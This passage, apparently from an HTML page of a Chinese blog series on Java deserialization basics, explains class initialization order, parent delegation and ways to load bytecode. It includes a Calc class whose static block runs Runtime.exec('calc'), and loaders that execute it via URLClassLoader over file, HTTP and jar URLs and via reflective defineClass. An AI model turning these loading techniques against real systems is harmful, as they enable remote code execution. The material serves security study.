+         <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 静态代码块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>   
+     <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.Person"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 静态代码块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>   
+     <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.Person"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//没有输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p><code>Class.forName(className)</code>和<code>Class.forName(className, true, ClassLoader.getSystemClassLoader())</code>等价，这两个方法都会调用类中的<strong>静态代码块</strong>，如果将第二个参数设置为<code>false</code>，那么就不会调用<strong>静态代码块</strong></p>
+<h3 id="场景六、使用-ClassLoader-loadClass-获取类"><a href="#场景六、使用-ClassLoader-loadClass-获取类" class="headerlink" title="场景六、使用 ClassLoader.loadClass() 获取类"></a>场景六、使用 ClassLoader.loadClass() 获取类</h3><p><strong>Main.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>xiinnn<span class="token punctuation">.</span>i<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.xiinnn.i.test.Person"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//没有输出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p><code>ClassLoader.loadClass()</code>方法不会进行类的初始化，当然，如果后面再使用<code>newInstance()</code>进行初始化，那么会和<code>场景一、实例化对象</code>一样的顺序加载对应的代码块。</p>
+<h2 id="0x04-动态加载字节码"><a href="#0x04-动态加载字节码" class="headerlink" title="0x04 动态加载字节码"></a>0x04 动态加载字节码</h2><ul>
+<li>在说动态加载字节码之前，先明确一下何为字节码。</li>
+</ul>
+<h3 id="1-字节码的概念"><a href="#1-字节码的概念" class="headerlink" title="1. 字节码的概念"></a>1. 字节码的概念</h3><p>什么是字节码？</p>
+<blockquote>
+<p>严格来说，Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。</p>
+</blockquote>
+<p>我个人很喜欢把它比作 Dockerfile 里面，执行命令的一些代码，例如 <code>entrypoint</code> 这种。</p>
+<p>而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaBytes.png" class="">
+
+<h3 id="2-类加载器的原理"><a href="#2-类加载器的原理" class="headerlink" title="2. 类加载器的原理"></a>2. 类加载器的原理</h3><p>根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。</p>
+<p>代码：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassLoader</span> c <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+c<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"BasiClassLoader.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>打一下断点，调试一下，断点打在 <code>ClassLoader.loadClass()</code> 的地方，也就是父类。为什么这么打断点是有原因的，因为最开始我们已知 “Person” 类它是 <code>Launcher@APPClassLoader</code>，它里面是有一个 <code>loadClass()</code> 方法的，但是它只有一个参数。所以断点下在 <code>ClassLoader.loadClass()</code> 之类</p>
+<p>开始调试</p>
+<p>调试先会走到 <code>ClassLoader.loadClass()</code>，这里其实 return 就多给了一个参数为 false；我们 ctrl + f7 跟进。又会回到 <code>Launcher@APPClassLoader</code> 这里。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/AppClassLoaderGetIN.png" class="">
+
+<p>中间是一些简单的判断安全的过程，这里就不看了，继续往下走，直到 <code>return (super.loadClass(name, resolve));</code> 这里，继续跟进。也就是回到了之前的 <code>ClassLoader</code> 类。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SecondClassLoader.png" class="">
+
+<p>往下走，先检查类是否加载过，这里其实就是双亲委派的流程了。我们之前说委派机制是从最下面网上找，如果上面有就调用上面的，如果上面没有，就调用本身，也就是 AppClassLoader</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ParentLoader01.png" class="">
+
+<p>这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。</p>
+<p>继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。</p>
+<p>接着在 URLClassLoader 里面调用了 defineClass 方法，再一步步跟进就是我们的 native 方法了。</p>
+<p>总的流程:<br>ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</p>
+<p>下面我们介绍多种能够用于反序列化攻击的，加载字节码的类加载器。</p>
+<hr>
+<blockquote>
+<p>Java 动态字节码的一些用法</p>
+</blockquote>
+<h3 id="3-利用-URLClassLoader-加载远程-class-文件"><a href="#3-利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="3. 利用 URLClassLoader 加载远程 class 文件"></a>3. 利用 URLClassLoader 加载远程 class 文件</h3><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 <code>Java </code>类加载器的工作流程。</p>
+<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
+<p>①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p>
+<p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p>
+<p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p>
+<p>我们一个个看</p>
+<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file 协议"></a>file 协议</h4><p>我们在目录下新建一个 Calc.java 的文件。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// URLClassLoader 的 file 协议  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着，点小锤子编译一下，我们会在 out 的 src 文件夹下发现编译过的 .class 文件。接着，我们进行一下复制的操作，将其复制到 E 盘。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/Copy.png" class="">
+
+<p>接着，我们编写 URLClassLoader 的启动类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// URLClassLoader 的 file 协议  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span>  
+                <span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"file:///E:\\"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span> calc <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.URLClassLoader.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功弹出了计算器</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/FileURLClassLoader.png" class="">
+
+<h4 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h4><p>在 <code>Calc.class</code> 文件目录下执行 <code>python3 -m http.server 9999</code>，起一个 http 服务。我这里是 E 盘根目录，就在 E 盘起。</p>
+<p>接着，我们编写恶意利用类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// URLClassLoader 的 HTTP 协议  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HTTPRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:9999"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span> calc <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.URLClassLoader.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/HTTPURLClassLoader.png" class="">
+
+<h4 id="file-jar-协议"><a href="#file-jar-协议" class="headerlink" title="file+jar 协议"></a>file+jar 协议</h4><p>先将我们之前的 class 文件打包一下，打包为 jar 文件。</p>
+<p>去到源 .class 文件下，别去复制的地方，运行命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jar -cvf Calc.jar Clac.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接着，我们修改启动器，调用恶意类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// URLClassLoader 的 file + jarpublic class JarRce &#123;  </span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"jar:file:///E:\\Calc.jar!/"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span> calc <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.URLClassLoader.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JarFileURLClassLoader.png" class="">
+
+<h4 id="HTTP-jar-协议"><a href="#HTTP-jar-协议" class="headerlink" title="HTTP + jar 协议"></a>HTTP + jar 协议</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce &#123;  </span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"jar:http://127.0.0.1:9999/Calc.jar!/"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Class</span> calc <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"src.DynamicClassLoader.URLClassLoader.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>成功弹出计算器</li>
+</ul>
+<p>最灵活的肯定是 http 协议的加载</p>
+<h3 id="4-利用-ClassLoader-defineClass-直接加载字节码"><a href="#4-利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="4. 利用 ClassLoader#defineClass 直接加载字节码"></a>4. 利用 ClassLoader#defineClass 直接加载字节码</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/JavaRun.png" class="">
+
+<p>从前面的分析可知：</p>
+<ul>
+<li><code>loadClass()</code> 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的<code>findClass()</code>方法；</li>
+<li><code>findClass()</code> 根据URL指定的方式来加载类的字节码，其中会调用<code>defineClass()</code>；</li>
+<li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的 Java 类<br>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java</li>
+</ul>
+<p>默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p>
+<p>我们跟进 ClassLoader 当中，去看一看 <code>DefineClass</code> 是怎么被调用的。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/DefineClass.png" class="">
+
+<p>解释一下 <code>defineClass</code></p>
+<p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p>
+<p>因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 <code>defineClass()</code> 方法进行字节码的加载，然后实例化之后即可弹 shell</p>
+<p>我们编写如下代码</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader<span class="token punctuation">.</span>DefineClass</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 利用 ClassLoader#defineClass 直接加载字节码  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineClassRce</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"E:\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 字节码的数组  </span>
+ <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">,</span> <span class="token string">"src.Calc"</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> code<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
